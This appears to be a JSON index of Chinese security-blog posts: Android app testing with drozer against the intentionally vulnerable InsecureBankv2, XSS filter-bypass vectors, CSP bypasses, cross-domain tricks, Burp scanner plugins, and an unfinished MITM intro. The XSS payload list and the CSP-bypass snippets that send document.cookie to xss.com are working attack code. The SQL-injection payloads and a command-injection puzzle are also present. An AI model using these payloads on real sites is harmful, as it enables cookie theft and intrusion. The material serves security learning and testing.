kB 0 B / 0 Bf35f291d6659 0.00% 9.806 MB / 1.044 GB 0.94% 8.638 kB / 8.422 kB 0 B / 0 Bdocker-machine 查看机器列表docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSdefault * virtualbox Running tcp://192.168.99.100:2376 v1.10.3 查看机器状态docker-machine status default 登录机器defaultdocker-machine ssh defaultdocker-compose 查看运行中的容器docker-compose ps Name Command State Portsdockerfiles_mysql_1 docker-entrypoint.sh mysqld Up 0.0.0.0:3306-&gt;3306/tcpdockerfiles_nginx_1 nginx -g daemon off; Up 443/tcp, 0.0.0.0:8080-&gt;80/tcpdockerfiles_php_1 php-fpm Up 0.0.0.0:9000-&gt;9000/tcp 运行容器docker-compose up","tags":[{"name":"软件","slug":"软件","permalink":"https://adrain09.github.io/tags/软件/"}]},{"title":"wireshark 普通用户启动","date":"2016-12-19T03:12:16.000Z","path":"2016/12/19/移动安全/wireshark 普通用户启动/","text":"添加wireshark用户组 1sudo groupadd wireshark 将dumpcap更改为wireshark用户组 1sudo chgrp wireshark /usr/bin/dumpcap 让wireshark用户组有root权限使用dumpcap 1sudo chmod 4755 /usr/bin/dumpcap 将需要使用的用户名加入wireshark用户组，我的用户名是craftor 1sudo gpasswd -a craftor wireshark","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"drozer测试InsecureBankv2","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/移动安全/drozer测试InsecureBankv2/","text":"测试app包名：com.android.insecurebankv2 intent sniffer(数据嗅探) 利用app.broadcast.sniff 模块 首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name 利用run app.broadcast.sniff –action theBroadcast 进行嗅探 结果获取到修改的密码信息：123456Broadcast receiver registered to sniff matching intents[*] Output is updated once a second. Press Control+C to exit.Action: theBroadcastRaw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;Extra: newpass=Dinesh@123! (java.lang.String)Extra: phonenumber=15555215554 (java.lang.String) 代码层次： 获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播 登入绕过 可查看manifast文件查找exported=“true”的activity名称 可以直接使用drozer activity模块查找暴露出的activity 测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面 备份安全测试 可查看manifast文件查看是否允许备份allowBackup=”true” 可利用drozer模块：run app.package.backup -f insecurebankv2查看 测试： 在当前目录下备份，在当前目录下会产生backup.ab 文件： 1adb backup -apk-shared com.android.insecurebankv2 读取该文件，后面可以看到登入账户的所有信息 1cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功) jdb调试app程序 使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid） 使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上 使用jdb -attach localhost:1111 链接调试端口，进行调试 测试： 实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来 本来为rooted，直接更改为 not rooted 可能用到的命令： class：查看所有用到的包名methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin直接在showRootStatus()方法上下断点，jdb主要命令step – 执行当前行step up – 执行到当前方法返回到其调用程序stepi – 执行当前指令next – 跳过一行（跨过调用）cont – 从断点处继续执行 运行过程中，观察locals的本地变量 出现变量：isrooted=true，利用set isrooted=false进行变量设置 run运行，发现提示变为未root hack 广播接受者,恶意发送短信 run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action 在反编译代码中查找该reveicer 本例中代码： 12345public void onReceive(Context paramContext, Intent paramIntent)&#123;Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信 触发这个的reveicer的代码： 12345678910111213private void broadcastChangepasswordSMS(String paramString1, String paramString2)&#123;if (TextUtils.isEmpty(paramString1.toString().trim()))&#123;System.out.println(&quot;Phone number Invalid.&quot;);return;&#125;Intent localIntent = new Intent();localIntent.setAction(&quot;theBroadcast&quot;);localIntent.putExtra(&quot;phonenumber&quot;, paramString1);localIntent.putExtra(&quot;newpass&quot;, paramString2);sendBroadcast(localIntent);&#125; 直接调用am命令： 1adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播 可以使用drozer 启动： 1run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad hack 数据库，provider drozer里面的命令run scanner.provider.finduris -a com.android.insecurebankv2扫描可以利用的provider 利用 run app.provider.query 进行查询 在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接 1adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看 攻击复制的数据adb shell su u0_a51 service call clipboard 2 s16 包名 攻击数据库若是数据库没有加密的话，直接pull下来，查看即可 不安全的log直接ddms或者adb logcat读取敏感数据 导出内存数据（未测试）ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof SSSSS.hprof格式化，利用app的内存分析工具分析内存。 加密解密在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"XSS向量","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/xss向量/","text":"总结一些XSS的向量 css xss向量 1&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999 利用反引号 123456&lt;!DOCTYPE html BLAH&gt;&lt;html&gt;&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;&lt;/html&gt; 利用%2f 1&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt; 利用html实体在href中html实体是可以反解出来的 1&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt; 其他： 123456789101112131415161718192021222324252627&quot;onmouseover=%0A&quot;confirm(1)/* HTML5 based entities were doing good in bypassing data URI RE */&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;/* The RE thinks that only alphanumeric characters are allowed after data URI */&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;/* The first two payloads bypasses the check on word expression with the help of \\ */&lt;div style=&quot;x:e\\x\\p\\r\\ession(alert(1))&quot;&gt;div&lt;/div&gt;&lt;p style=&apos;\\x:\\65xpre\\73sio\\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;/* The regular expression was expecting ( after the keyword expression */&lt;div style=&quot;width:expression\\28 alert \\28 1\\29 \\29&quot;&gt;I will bypass you&lt;/div&gt;/* Decimal Encoding without the presence of ; bypasses the regular expression */&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"CSP bypass","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/绕过csp发送cookie/","text":"绕过CSP发送cookie dns 預读取 firefox 1&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns chrome 1234chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可直接用get方式把cookie传递到攻击者的服务器上&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;只需要用js动态创建元素的方法,就可在href中插入cookie 通用的bypass 其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如: 123&lt;script&gt;window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt; 比如动态创建元素,再引发页面跳转 123var a=document.createElement(&quot;a&quot;);a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);a.click(); 或者是使用标签进行跳转 1&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt; 123var i=document.createElement(&quot;img&quot;);i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);xxx.appendChild(i);","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"跨域获取数据小结","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/跨域获取数据小结/","text":"本文主要介绍几种跨域获取数据的方法，比较基础，但是在跨站漏洞的挖掘和利用上会起到很大的帮助。 下面根据个例子简单的把遇到的跨域总结下 场景：网站A获取网站B上的资源，需要跨域传输数据 两种情况： 1、B站资源可控，即可以更改B站资源内容 2、B站资源不可控 测试环境： 我们这里设置简单点，为了下面的说明，统一设置到test.com域下，只是二级域名不相同。只要不设置document.domain,这样也不算是同域 hosts设置： ip a.test.com ip b.test.com 测试需求： 利用a站获取到b站的资源 首先采用直接使用iframe加载，直接使用js来获取数据 B站点要获取的data文件内容： 12&lt;p id=\"data\"&gt; Hello A Site, I am from B site!! &lt;/p&gt; A站点获取数据html代码： 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;title&gt;A want to get B data&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/data.html';iframe.style.display = 'none';iframe.onload = function() &#123; var doc = iframe.contentDocument || iframe.contentWindow.document; console.log(doc.getElementById('data').textContent);&#125;document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在chrome下访问A站的getB.html，出现 Uncaught SecurityError: Failed to read the ‘contentDocument’ property from ‘HTMLIFrameElement’: Blocked a frame with origin “http://a.test.com“ from accessing a frame with origin “http://b.test.com“. Protocols, domains, and ports must match. 同源策略直接进行了阻止,防止进行跨域操作。 很多时候会采用ajax去获取访问数据，下面是获取数据代码： 12345678910111213141516171819202122232425&lt;html&gt;&lt;script&gt;var xmlhttp;if (window.XMLHttpRequest) &#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125;else &#123;// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125;xmlhttp.open(\"GET\",\"http://b.test.com/data.html\",true);xmlhttp.send();xmlhttp.onreadystatechange=function() &#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; console.log(xmlhttp.responseText); &#125; &#125;&lt;/script&gt;&lt;/html&gt; 访问，看chrome下面的提示： XMLHttpRequest cannot load http://b.test.com/data.html. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘http://a.test.com‘ is therefore not allowed access. 下面分两种情况实现跨域获取数据： B站的资源是可控的 通过document.domain来控制 同主域名下iframe控制document.domain进行读取，修改data.html和getB.html内容增加域的设置： document.domain=”test.com” 再次访问，成功获取到数据信息，这个是最简单的，大域是相同的，都是可以去利用的。其实所有的com网站，cn网站都是一个大域，不过现在浏览器拒绝了这样的请求 iframe结合location.hash进行跨域数据获取 B站下data文件： 123456789101112&lt;script&gt;data = 'ImBsitedata';var ifr = document.createElement('iframe');ifr.src = 'http://a.test.com/hash/proxy.html#'+data;document.body.appendChild(ifr);&lt;/script&gt; A站下的proxy文件： 123&lt;script&gt;parent.parent.location.hash = self.location.hash.substring(1);&lt;/script&gt; 主要是B站的data文件iframe加载proxy，hash获取到data数据，传递给proxy.html的hash中，proxy获取到hash传递给同源的A站 getB_byhash.html 123456789101112131415161718192021&lt;html&gt;&lt;head&gt; &lt;title&gt;Site A&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/hash/data.html';document.body.appendChild(iframe);var checkOut = function() &#123;try &#123;var data = location.hash ? location.hash.substring(1) : '';if (console.log) &#123;console.log('new data is: ' + data);&#125; &#125; catch(e) &#123;&#125;&#125;setInterval(checkOut, 2000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 主要是利用A站获取数据文件iframe加载B站的data文件，data文件又加载A站的proxy文件，proxy的hash中存有B站的数据，proxy和get文件同源，利用parent.parent两个父页面传递出hash 通过iframe.name跨域传递数据 B站的data文件为： 123&lt;script&gt;window.name = \"I am from B site!!!\";&lt;/script&gt; A站getB_byname.html的内容： 1234567891011121314151617181920212223&lt;html&gt;&lt;head&gt; &lt;title&gt;Site A&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var state = 0;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/name/data.html';var loadfn = function() &#123;if (state === 1) &#123;var data = iframe.contentWindow.name;console.log(data);&#125; else if (state === 0) &#123;state = 1;iframe.contentWindow.location = 'http://a.test.com';&#125;&#125;iframe.onload = loadfn;document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码可以变得更简单点： 1234567891011121314151617&lt;body&gt;&lt;script&gt;stats=0var iframe=document.createElement(\"iframe\");iframe.onload=function () &#123;if(stats===0)&#123;stats=1;iframe.src=\"http://a.test.com/\";&#125;else&#123;console.log(iframe.contentWindow.name);&#125;&#125;;iframe.src=\"http://b.test.com/name/data.html\";document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt; 原理： 主要就是先iframe 加载数据页面，此时window.name传递给了iframe的name，在利用跳转到同源的页面下，输出数据。 json劫持 B站的data数据： 1var data=\"I am from B site!!!\" A站的get代码： 1234&lt;script src=\"http://b.test.com/json/data.html\"&gt;&lt;/script&gt;&lt;script&gt;console.log(data);&lt;/script&gt; html5中的postMessage B站的data数据： 123window.onload=function()&#123; parent.postMessage(&apos;I am B data!!&apos;,&apos;*&apos;);&#125; 获取数据代码： 123456&lt;iframe src=&quot;http://b.test.com/H5/data.html&quot;&gt;&lt;/iframe&gt;&lt;script&gt;window.addEventListener(&apos;message&apos;,function(e)&#123; alert(e.data);&#125;)&lt;/script&gt; 这个可以参考下呆子不开口的《对方不想说话并扔了个message》 CORS 主要就是通过设置相应头中的 Access-Control-Allow-Origin 字段。前面直接用ajax获取数据时候已经提示了。 Access-Control-Allow-Origin 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 Access-Control-Allow-Origin 中包含网站 A 或者设置为 * 时，网站 A 即可对网站 B 上的资源进行任意访问。 也就是利用ajax请求可以获取到数据信息的。 php文件： 1234567&lt;?phpheader(&quot;Access-Control-Allow-Origin: *&quot;);echo &quot;Site B PHP resource!!&quot;;?&gt; 设置 Access-Control-Allow-Origin 允许所有站点访问读取 get代码： 12345678910111213141516171819&lt;script&gt;var xml = new XMLHttpRequest();xml.open(&apos;get&apos;, &apos;http://b.test.com/data.php&apos;, true);xml.onreadystatechange = function() &#123;if (xml.readyState == 4 &amp;&amp; xml.status==200) &#123;console.log(xml.responseText);&#125;&#125;xml.send();&lt;/script&gt; B站资源不可控 利用中间代理访问,方法利用php页面去访问数据页面获取到数据，在利用cors传递回来。 代理代码： 123456789101112131415&lt;?phpheader('Access-Control-Allow-Origin: *');$method = $_REQUEST['method'];$target = $_REQUEST['target'];$data = $_REQUEST['data'];$curl = curl_init();curl_setopt($curl, CURLOPT_URL, $target);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0);if ($method == 'post') &#123;curl_setopt($curl, CURLOPT_POST, 1);curl_setopt($curl, CURLOPT_POSTFIELDS, $data);&#125;curl_exec($curl);curl_close($curl);?&gt; A站直接ajax请求proxy即可 12345678910111213141516171819&lt;script&gt;varxhr=newXMLHttpRequest();varproxyUrl='http://issec.xxxx.com/proxy/proxy.php';xhr.open('post',proxyUrl,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('method=get&amp;target=http://b.test.com/proxy/data.html&amp;data=');xhr.onreadystatechange=function()&#123; if(xhr.readyState==4&amp;xhr.status==200) &#123;console.log(xhr.responseText)&#125;&#125;&lt;/script&gt; 讨论： 你还有那些跨域获取数据的方法？ 问题： 这里面代码里面存在哪几个漏洞设置？ 讨论下same攻击 首先php代码是有缺陷的，不去设置过多，最简单的，页面内容不可控： 地址为：www.same.com/1.php 123456&lt;?php$callback = $_GET['callback'];$callback=preg_replace(\"/[')(&lt;&gt;&#123;&#125;]|\\]|\\[|\\/|\\\\\\|\\\"|\\|/\",\"\",$callback);echo \"&lt;script&gt;\".$callback.\"()&lt;/script&gt;\";?&gt; 这里有个html页面，里面就是个点击的按钮，页面内容不可控： 地址为www.same.com/1.html 1&lt;button id=\"pid\" onclick=alert('click')&gt;&lt;/button&gt; 怎么实现自己写个站点页面（不能和same同域），让其他人访问这个页面后出现点击事件？分别考虑下1.php限制了referer和不限制referer的情况。","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"基于burp插件的安全测试","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/","text":"基于burp插件的安全测试前言burp是很多web安全爱好者都会用到的神器，burp专业版集成了代理、fuzzing、重放、扫描等功能，对于自动化扫描功能来说，里面的poc都是官方集成好的，很难增加自己的特殊poc代码，最新版开放了burp的开发api，利用api可以很简单的集成自己的扫描poc，针对特定的站点进行针对性的扫描 相对于其他扫描器，基于burp的自动化扫描可以不用考虑登入、cookie的处理问题，以及不用考虑爬虫爬不到的链接，只要你点击站点所有的页面后，burp的代理功能都会记录下请求来，设置不用考虑poc的插入位置问题，burp默认会对所有的位置进行poc的插入测试，连url里面的path路径都会涉及到。 基本知识burp在extender标签中，可以增加自己的插件代码，支持python、ruby、java，在测试中发现，java的效率是最高的，并且开发起来，在ide中导入jar包很容易开发，比起python、ruby还需要第三方插件的支持，并且效率比起java还是比较慢 在BAPP Store中有很多开发好的插件代码，可以下载下来，安装后，在指定的目录下面会有相应的python代码或者jar包存在，这些都是很好的学习代码，推荐几个比较好用的插件： JSON Decoder，可以将json数据格式化，比较方便查看。 Active Scan++ 增加了一些本身自动化扫描没有的漏洞检查。 在APIs中是burp提供的api接口，自己没有接触过java代码，看起来比较费劲，可以先不用管他，可以在编写插件的时候了解到怎么使用和功能等等。 下面的save，可以将这些api文件保存起来，后面编写java代码直接调用相应的接口 Options里面是一些设置，主要是设置一些运行环境，比如你想用python写插件的话，就需要安装jython第三方包了 sql注入插件开发开发插件使用的是IDEA，创建一个新工程，创建一个新的package，注意这里命名为burp，将我们下载好的api包导入这个package中，后面需要创建插件的主要代码程序，这里还需要注意，这个代码文件的命名需要是BurpExtender，这个是必须的。 这里我们做一个基于时间延时的sql注入扫描，sqlmap里面也有，但是sqlmap跑起来太慢，burp的自动化扫描，针对时间的sql注入扫描并不是很好用，poc比较少。 由于我们这个插件主要做的就是把参数后面增加poc或者替换参数值为poc再去访问，判断执行时间是否有延时 看了Active Scan++的源码，在IScannerCheck接口中有自动化的扫描函数：doActiveScan，并且会自动化的把poc插入到每一个测试点中，我们做的就是把poc给他，然后访问，看访问执行到访问结束的时间 给出简单代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class BurpExtender implements IBurpExtender, IScannerCheck&#123; //实现IScannerCheck的doActiveScan // 实现IBurpExtender的registerExtenderCallbacks，来注册插件 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)&#123; //注册插件，使burp可以加载到我们的插件 payloads[xxx]=\"*if(now()=sysdate() and 1=1,SLEEP(10),0)\"; //自己的payload列表，将自己的注入poc写在这里 this.mcallbacks = callbacks; stdout = new PrintWriter(callbacks.getStdout(), true); helpers = callbacks.getHelpers(); //helpers非常有用，可以帮你处理很多东西，这个后续需要好好研究下 callbacks.setExtensionName(\"FuckScan\"); callbacks.registerScannerCheck(this); &#125; // 上述代码就可以将自己的插件增加到burp里面了 @Override public List&lt;IScanIssue&gt; doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) &#123; // 这里重写doActiveScan，在自动话扫描的时候增加我们的扫描代码 // baseRequestResponse 是IHttpRequestResponse类型，这个里面包含了当前请求的所有信息，包括request和response信息 // insertionPoint 是插入点，里面可以自动设置只在哪个位置进行插入测试，测试过程中发现代码有问题，只好全部扫描了 String value = insertionPoint.getBaseValue(); //这个是先取下插入点的参数值，有的poc需要的是增加在原有的参数值后面生效的 SqlScanner(baseRequestResponse,insertionPoint,value);//将当前的页面信息，插入点，和原有参数值传递到sql注入扫描中 &#125; public void SqlScanner(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint,String value)&#123; if(payload.contains(\"*\"))&#123;//在poc中进行设置，主要出现×的就直接用poc测试，没有出现的用原有值增加poc测试 payload_byte = payload.getBytes();//这里注意所有的操作，都是基于byte类型基础上的，需要进行转化处理 &#125; else &#123; payload_byte = (value + payload).getBytes(); &#125; byte[] checkRequest = insertionPoint.buildRequest(payload_byte);//这里是创建新的request，主要是将poc加入的重新生成一个request long start = System.currentTimeMillis();//记录当前时间 IHttpRequestResponse checkqeuestResponse = this.mcallbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest); // 这个是带poc去请求，我不管正常的请求时间，只需要知道这个request运行了多少时间 // getHttpService，返回的是包含现在所有http服务请求的object // makeHttpRequest 是使用checkRequest并重新请求获取服务器的响应 //为了减少误报，这里采用了两次请求的方法，结果比一次好些 // TODO:需要判断下原请求的时间，过程中还是发现不少误报 long end = System.currentTimeMillis();//记录请求结束时间 if (runtime &gt; 9000)&#123;//poc中做的都是延时10秒，若有sql注入时间会出现比较大的延时 stdout.println(\"[SQL注入成功:]\"); stdout.println(helpers.bytesToString(checkRequest));//在log中打印此次请求的request //TODO:后续利用IScanIssue增加到burp的扫描结果中 &#125; &#125;&#125; 这就是基于time延时的扫描插件，很简单的几行代码就能结合burp本身的优势将我们的poc增加到自动化扫描里面 我自己结合cloudeye增加了命令执行的检查，简单的用curl，将当前有命令执行的请求传递到cloudeye的日志里面，测试过程中发现见有几个产生了dns请求，没有执行curl，没有访问日志 AES加解密插件开发在测试的过程中还需要一个问题，很多android在数据传输的时候对数据进行了加密处理，在测试的时候没有办法增加自己的poc来对进行测试，但是反编译app能发现AES的私钥硬编码在app中这样可以在流量通过burp的时候对流量进行解密再增加poc再加密发送出去进行测试 这个大牛们写过这方面的文章，自己也是在参考他们的基础上完成的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class BurpExtender implements IBurpExtender, IHttpListener, IMessageEditorTabFactory &#123; //初始化使用的对象 private IBurpExtenderCallbacks callbacks; private IExtensionHelpers helpers; private PrintWriter stdout; private String skey = \"FL5LCBJL3JN534JC\"; //AES私钥 private String IV = \"E68CFL7BK8KCCG6N\";//AES IV //注册插件 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123; stdout = new PrintWriter(callbacks.getStdout(), true); this.callbacks = callbacks; helpers = callbacks.getHelpers(); callbacks.setExtensionName(\"AES encrypt java edition\"); callbacks.registerHttpListener(this);//为下面的processHttpMessage 注册,否则下面的方法不能使用 &#125; @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123; //这个是对IHttpListener的方法改写，The listener will be notified of requests and responses made by any Burp tool. // toolFlag 是来定义那些请求是需要进行处理的。不同的参数值代表burp的不同位置 // messageIsRequest 消息是否是请求包 // messageInfo 包内容 if (toolFlag == 64 || toolFlag == 16 || toolFlag == 32 || toolFlag == 4) &#123; //不同的toolflag代表不同的burp组件,16:scanner;64:repeater;32:interuder;4:proxy //详情查看:https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks if (messageIsRequest) &#123;//请求包 IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);//利用helper自动处理请求包 List&lt;String&gt; headers = analyzeRequest.getHeaders();//获取请求头列表 List&lt;IParameter&gt; paraList = analyzeRequest.getParameters();//获取参数列表,参数分为三类:URL\\COOKIE\\BODY byte[] new_Request = messageInfo.getRequest(); for (IParameter para : paraList) &#123;//循环获取参数,判断类型,进行加密处理后,再构造新的参数,合并到请求包中 if ((para.getType() == 0 || para.getType() == 1) &amp;&amp; !paraWhiteList.contains(para.getName())) &#123;//通过type来判断参数位于那个位置, // cookie是不需要处理的 String key = para.getName(); String value = para.getValue(); aesvalue = aes.encrypt(skey, IV, value); aesvalue = helpers.urlEncode(aesvalue);// aesvalue = URLEncoder.encode(aesvalue, \"UTF-8\");//进行url编码// stdout.println(\"[ENCODE:]\" + key + \":\" + value + \":\" + aesvalue); //输出到extender的UI窗口 IParameter newPara = helpers.buildParameter(key, aesvalue, para.getType());//构造新的请求参数 new_Request = helpers.updateParameter(new_Request, newPara);//构造新的请求包 messageInfo.setRequest(new_Request);//设置最新的请求包 &#125; &#125; &#125; else &#123;//处理返回的响应包，就是把返回的响应进行解密后展示出来，设计到几个api中的函数，看名称应该知道什么意思了 IResponseInfo anaylyzeResponse = helpers.analyzeResponse(messageInfo.getResponse()); List&lt;String&gt; header = anaylyzeResponse.getHeaders(); short statusCode = anaylyzeResponse.getStatusCode(); int badyOffset = anaylyzeResponse.getBodyOffset(); AESOperator aes = new AESOperator(); String resp = new String(messageInfo.getResponse()); String body = resp.substring(badyOffset); String debody = aes.decrypt(skey, IV, body); debody = debody.replace(\"\\\"\", \"\\\\\\\"\"); String UnicodeBody = (new CharSetUtil()).decodeUnicode(debody); String newBody = UnicodeBody; byte[] bodybyte = newBody.getBytes(); messageInfo.setResponse(helpers.buildHttpMessage(header, bodybyte)); 这个AES的加解密插件只要针对不同的加密密钥更改就行，可以很方面的解密出app中传递的参数，有的app还有增加sign校验值，只要反编译app获取算法后一样可以增加到插件中，这样就能对加密和增加校验值的进行web测试了 插件扫描结果在测试新浪的服务的时候，直接打开自动扫描，可以把burp内置的扫描关闭掉，这样速度还是可以的，只要浏览sina的页面，插件自动进行扫描，结果发现sina的两处sql注入问题，这个要感谢川神的支持 当然测试中针对不同的网站特定进行手工的测试，总结出通用的poc之后加入到插件中去，直接在访问页面的时候就可以发现漏洞了 AES加解密的插件，利用起来可以查看一个乌云的一个案例Zealer_android客户端安全检测 TODO 学习java代码，优化插件 增加更多的扫描插件，需要更对测试，获取每个网站业务特定漏洞poc，后续可以集成到自己的一个插件框架下面，在burp下面增加可以增加poc的输入框。 总结自己在java方面算是入门级别，这些也都是是参考各位大牛的基础上写的，过程中感觉很大一部分简单的知道java调用就行，主要是api的使用，当然会java的应该会编写出更加牛叉的测试插件，burp是个神器，在神器作为平台开发插件可以介绍很多工作量和避免很多坑。 有很多的神器都是提供插件的集成的，网页浏览chrome本身就是一个框架，可以自己写chrome插件，端口扫描神器nmap也可以自定义插件扫描，移动安全方面，android hook方面有xposed框架，应用安全检测方面有drozer框架，自己开发插件集成可以玩出很多花样。 问题以下代码可能存在什么问题？ 123456789101112131415161718&lt;?php extract($_POST); // 輸入淨化 if (!mb_detect_encoding($p1, 'UTF-8', true) &amp;&amp; !mb_detect_encoding($p1, 'big5', true)) &#123; die(\"funny how a melody sounds like a memory\"); &#125; $p1 = mb_ereg_replace(\"\\\\\\\\\", \"\\\\\\\\\", $p1); $p1 = mb_ereg_replace(\"\\\"\",\"\\\\\\\"\", $p1); $p1 = mb_ereg_replace(\"\\\\$\", \"\\\\$\", $p1); $p1 = mb_ereg_replace(\"`\", \"\\\\`\", $p1); // 記錄日誌 exec_sql(\"INSERT INTO iface_log (content, data) VALUES(?, ?)\", \"ss\", \"Remote interface called\", json_encode(array('p1'=&gt;$p1, 'p2'=&gt;$p2))); // 執行轉換 system(\"timeout 2 /scripts/convert.sh reverse \\\"$p1\\\"\");","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"中间人攻击获取ssl数据","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/","text":"数据流量重定向 使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。 手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法 DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。 修改受害者机器的/etc/hosts的条目来 转向某些域名的流量 ARP欺骗 环境： 